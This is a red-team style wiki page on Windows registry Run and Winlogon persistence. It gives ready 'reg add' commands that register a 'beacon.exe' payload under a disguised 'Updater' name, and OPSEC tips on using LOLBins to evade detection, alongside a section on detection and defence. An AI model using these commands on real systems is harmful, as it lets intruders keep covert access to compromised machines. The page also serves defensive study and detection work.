---
title: Registry Run Keys Persistence
slug: registry-run-keys-persistence
---

> **TL;DR:** Drop a value under `HKCU\…\Run` (or `HKLM` for system-wide) and your payload executes on every logon — trivial to set, trivially monitored.

## What it is
The `Run`, `RunOnce`, and Winlogon registry hives are the most well-known persistence locations on Windows (MITRE T1547.001). Userland code with write access to `HKCU` can drop a value whose data is a command line; Userinit / explorer.exe execute every value at interactive logon. `RunOnce` keys execute once and are then deleted by the OS. The HKLM variants require admin but persist system-wide. Winlogon's `Userinit` and `Shell` values are richer because they fire even earlier in the logon sequence.

## Preconditions / where it applies
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` — user-level write, no admin
- `HKLM\Software\Microsoft\Windows\CurrentVersion\Run` — requires admin / `SeRestorePrivilege`
- `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit|Shell` — admin, fires before shell init
- Triggers at interactive logon only — no persistence against a server that never sees a console session

## Technique
Loudest persistence on the menu. Useful for low-effort lab boxes, dangerous on a monitored estate — every endpoint product, Autoruns and Sysmon flag these keys.

```cmd
:: per-user, no admin
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" ^
    /v Updater /t REG_SZ /d "C:\Users\Public\beacon.exe" /f

:: system-wide
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" ^
    /v Updater /t REG_SZ /d "C:\ProgramData\beacon.exe" /f

:: Winlogon Userinit — append, do not replace, or you brick logon
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" ^
    /v Userinit /t REG_SZ ^
    /d "C:\Windows\system32\userinit.exe,C:\ProgramData\beacon.exe" /f
```

OPSEC: bare `.exe` paths in Run keys are a giveaway. Better living-off-the-land variants chain through `rundll32`, `regsvr32`, or a signed LOLBin pointing at a registry-stored payload. Consider [[com-hijacking]] or scheduled tasks for stealthier alternatives.

## Detection and defence
- Sysmon event ID 12/13 (RegistryEvent) on the Run/RunOnce/Winlogon paths — set `HKLM\…\Run` and `…\Winlogon\*` in your config
- 4657 (registry value modified) when audit subcategory is enabled
- Sysinternals Autoruns, baseline diff per host; EDR ASR rule "Block persistence through WMI event subscription" is adjacent but not equivalent
- Restrict write to `HKLM` hives via least-privilege; AppLocker / WDAC blocks the dropped payload even if the key is set

## References
- [ired.team — Windows Logon Helper](https://www.ired.team/offensive-security/persistence/windows-logon-helper) — Winlogon registry persistence
- [MITRE ATT&CK T1547.001](https://attack.mitre.org/techniques/T1547/001/) — Registry Run Keys / Startup Folder
